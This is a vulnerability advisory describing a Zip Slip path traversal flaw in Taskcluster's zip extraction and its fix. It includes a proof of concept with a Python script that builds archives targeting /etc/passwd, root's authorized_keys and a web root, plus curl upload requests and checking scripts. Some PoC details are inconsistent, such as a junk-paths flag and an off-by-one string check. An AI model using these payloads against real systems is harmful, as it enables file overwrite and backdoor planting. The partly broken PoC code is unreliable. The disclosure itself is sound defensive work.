## Summary
A **Path Traversal (Zip Slip)** vulnerability was identified in the Taskcluster project, specifically within the zip extraction logic of the build process. This flaw allowed maliciously crafted ZIP archives to write files **outside of the intended destination directory**, potentially leading to **arbitrary file overwrite** or **remote code execution (RCE)** depending on the environment where the extraction occurs.
The issue was responsibly reported and has been patched in [PR #7961](https://github.com/taskcluster/taskcluster/pull/7961/files).


The vulnerability existed in the zip extraction routine where file paths from ZIP entries were used **without proper canonicalization or boundary checks**.
When a ZIP archive contains files with directory traversal sequences such as `../../`, the extraction logic could inadvertently write those files outside the target directory (e.g., system directories or sensitive configuration paths). This flaw occurred before the security fix added in [this commit](https://github.com/taskcluster/taskcluster/pull/7917/files#diff-0c4d07d63afa28ee7801e0baed7c3e3ac45eb6ac03ce62df3ff3ba10d198b785R117-R129), where no validation was performed to ensure that extracted file paths remained confined within the designated destination folder.

The vulnerable code constructed file output paths directly from `f.Name` within the ZIP without verifying that the resulting absolute path stayed under the intended extraction directory (`dest`).

**Fixed Implementation (from PR #7917):**
The patch introduces robust path normalization and validation:

1. `filepath.Join(dest, f.Name)` constructs the file path.
2. `filepath.Clean()` sanitizes it.
3. Both destination and file paths are resolved to absolute form.
4. The extraction continues only if the file’s absolute path **starts with** the absolute path of `dest` (with a trailing path separator).
5. If this validation fails, extraction is aborted to prevent traversal.

This fix effectively mitigates the Zip Slip vulnerability by enforcing strict directory confinement.


## PoC
Below is a minimal Proof-of-Concept demonstrating the vulnerability before the patch:

```bash
# Create a malicious zip containing a file with directory traversal
mkdir poc && cd poc
echo "malicious overwrite" > evil.txt
zip --junk-paths exploit.zip ../../../../tmp/pwned.txt
go run vulnerable_taskcluster.go --extract exploit.zip --dest ./output

# File /tmp/pwned.txt will be created or overwritten outside the intended directory.
```

The extraction process safely aborts with an error similar to:
```
error: zip entry escapes destination directory
```
No file is written outside `--dest`.

#### Environment Setup
```bash
git clone https://github.com/taskcluster/taskcluster.git
cd taskcluster
git checkout <vulnerable-commit-before-patch>

cd services/worker
go build

./worker --config local-config.yml
```

#### Create Malicious Zip Archive
```python
import zipfile
import os

def create_malicious_zip():
    with zipfile.ZipFile('exploit.zip', 'w') as zf:
        zf.writestr('legitimate.txt', 'This is a normal file')
        
        malicious_paths = [
            '../../../../etc/passwd',
            '../../../../tmp/backdoor.sh',
            '../../../../var/www/html/index.php',
            '../../../../root/.ssh/authorized_keys'
        ]
        
        for path in malicious_paths:
            zf.writestr(path, f'# MALICIOUS CONTENT: {path}\necho "System compromised"')
    
    print("Malicious zip created: exploit.zip")
    print("Contains path traversal entries targeting system files")

if __name__ == '__main__':
    create_malicious_zip()
```

#### Execute the Exploit
```bash
python3 create_zip_slip_poc.py

curl -X POST http://localhost:8080/artifacts \
  -F "file=@exploit.zip" \
  -F "taskId=test-task" \
  -F "runId=0"

curl -X POST http://localhost:8080/api/worker/v1/artifacts/extract \
  -H "Content-Type: application/json" \
  -d '{
    "taskId": "test-task",
    "runId": 0,
    "artifact": "exploit.zip",
    "destination": "/tmp/extraction"
  }'
```

#### Verification 
```go
package main

import (
    "fmt"
    "os"
    "path/filepath"
)

func checkSystemFiles() {
    criticalFiles := []string{
        "/etc/passwd",
        "/tmp/backdoor.sh", 
        "/var/www/html/index.php",
        "/root/.ssh/authorized_keys",
    }
    
    for _, file := range criticalFiles {
        if _, err := os.Stat(file); err == nil {
            content, _ := os.ReadFile(file)
            if string(content)[0:18] == "# MALICIOUS CONTENT" {
                fmt.Printf("VULNERABILITY CONFIRMED: %s was modified!\n", file)
            }
        }
    }
}

func main() {
    fmt.Println("Checking for Zip Slip exploitation...")
    checkSystemFiles()
}
```


```bash
echo "TaskCluster Zip Slip PoC"
echo "======================================"

mkdir -p /tmp/taskcluster_test
cd /tmp/taskcluster_test

mkdir -p fake_dir
echo "malicious content" > fake_dir/payload.txt

zip exploit.zip ../../../etc/passwd ../../../tmp/backdoor.sh

echo "Malicious archive created with path traversal entries"
echo "Content of zip file:"
unzip -l exploit.zip

echo ""
echo "When extracted by vulnerable TaskCluster worker, this will attempt to write to:"
echo "  - /etc/passwd"
echo "  - /tmp/backdoor.sh"
echo ""
echo "Check these files after extraction for modifications"
```

#### Expected Results
When the malicious zip is processed by the vulnerable TaskCluster worker:

1. **Successful Exploitation Indicators:**
   - Files created outside extraction directory
   - System files modified with malicious content
   - New files in sensitive directories (`/etc/`, `/root/`, `/var/www/`)

2. **Error Logs (if extraction fails partially):**
   ```log
   Error creating directory: permission denied
   Error writing file: permission denied
   ```

3. **Post-Exploitation Verification:**
   ```bash
   ls -la /etc/passwd
   ls -la /tmp/backdoor.sh
   
   ls -la /tmp/extraction/
   ```

## Impact

Local or remote, depending on how ZIP files are provided to the extraction routine.

## Refferences
- https://hackerone.com/reports/3409448
- https://github.com/taskcluster/taskcluster/pull/7961
- https://github.com/taskcluster/taskcluster/pull/7917
- https://github.com/taskcluster/taskcluster/releases/tag/v91.1.1
